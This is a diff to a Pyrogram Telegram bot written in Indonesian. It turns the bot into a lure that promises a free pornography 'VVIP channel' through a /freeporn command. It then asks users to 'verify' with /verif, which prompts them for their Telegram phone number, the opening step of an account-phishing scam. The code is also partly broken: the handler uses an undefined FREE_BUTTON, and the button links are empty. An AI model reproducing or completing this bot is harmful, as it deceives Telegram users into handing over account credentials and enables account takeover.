@@ -26,12 +26,12 @@ app = pyrogram.Client(
 
 # START YA INI JINK !
 
-START_MESSAGE = """ 👋🏻 Halo saya Adalah bot yang dibuat untuk orang yang Rexa anggap Special
-Ketik mulai untuk memulai Bot ini :)
+START_MESSAGE = """ 👋🏻 Halo saya Adalah Spesial Bot VVIP Channel gratis
 
-⚠️ Aturan pakai, jangan mengetik jika tidak disuruh mengetik!!
+Silahkan Ketik :
+/freeporn untuk mendapatkan Channel VVIP gratis mu
 
-👨‍💻 Owner :
+⚠️ Tinggalkan Bot ini jika kamu tidak percaya Dengan Bot ini
 """
 
 START_BUTTON = [
@@ -49,6 +49,47 @@ async def start(_, message):
         reply_markup=reply_markup,
         disable_web_page_preview=True
     )
+
+# FREEPORN HANDLER 
+
+FREE_MESSAGE = """
+⚠️ Untuk mengakses Channel dibawah silahkan Verifikasi dirimu terlebih dahulu, agar akunmu terdaftar di database bot ini
+
+Silahkan Ketik /verif
+"""
+
+KESATUTOMBOL = [
+            [
+                InlineKeyboardButton("HAPUS", url="https://t.me/"),
+            ],
+            [
+                InlineKeyboardButton("Lanjut", url="https://t.me"),
+            ],
+            [
+                InlineKeyboardButton("ch3", url="https://t.me/" ),
+            ],
+            [
+                InlineKeyboardButton("ch4", url="https://t.me/"),
+            ],
+        ]
+
+@app.on_message(filters.command("freeporn") & filters.private)
+async def free(_, message):
+    text = FREE_MESSAGE
+    reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
+    await message.reply(
+        text=text,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+# VWRIF CMD
+
+@app.on_message(filters.command("verif") & filters.private)
+async def verip(_, message):
+    await app.send_message(message.chat.id, "Silahkan Masukann Nomer Telpon akun Telegram mu..")
+
+
 
 # DATABASE !!!
 
